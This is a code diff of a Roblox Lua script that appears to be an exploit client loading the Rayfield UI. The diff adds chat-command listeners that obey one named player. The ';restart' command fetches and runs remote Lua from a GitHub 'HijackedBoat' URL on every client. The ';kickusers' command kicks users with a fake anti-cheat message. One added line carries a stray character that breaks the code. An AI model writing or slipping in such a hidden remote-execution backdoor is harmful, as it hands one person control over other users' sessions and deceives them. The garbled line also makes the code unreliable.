@@ -1,25 +1,21 @@
-local LocalPlayer = game.Players.LocalPlayer
-
+local commandplr = game.Players.LocalPlayer
 local function onChatMessage(message, plr)
     if plr then
         if message:match(";restart") and plr.Name == "GuestNoob101013" then
-           loadstring(game:HttpGet("https://raw.githubusercontent.com/WasiTC/HijackedBoat/refs/heads/main/HijackedBoat.lua"))()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/WasiTC/HijackedBoat/refs/heads/main/HijackedBoat.lua"))()
         end
     end
 end
 
 for _,v in ipairs(game.Players:GetPlayers()) do
-  v.Chatted:Connect(function(m) onChatMessage(m, v) end)
+q  v.Chatted:Connect(function(m) onChatMessage(m, v) end)
 end
-game.Players.PlayerAdded:Connect(function(v) v:Chatted:Connect(function(m) onChatMessage(m, v) end) end)
-
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
+game.Players.PlayerAdded:Connect(function(v) v.Chatted:Connect(function(m) onChatMessage(m, v) end) end)
 
 local function onChatMessage(message, plr)
     if plr then
         if message:match(";kickusers") and plr.Name == "GuestNoob101013" then
-           LocalPlayer:Kick("Anti-Cheat: You have been kicked for exploiting. | Cheat Detected: HijackedBoat")
+            commandplr:Kick("Anti-Cheat: You were kicked for exploiting. | Cheat Detected: HijackedBoat")
         end
     end
 end
@@ -27,7 +23,7 @@ end
 for _,v in ipairs(game.Players:GetPlayers()) do
   v.Chatted:Connect(function(m) onChatMessage(m, v) end)
 end
-game.Players.PlayerAdded:Connect(function(v) v:Chatted:Connect(function(m) onChatMessage(m, v) end) end)
+game.Players.PlayerAdded:Connect(function(v) v.Chatted:Connect(function(m) onChatMessage(m, v) end) end)
 
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 
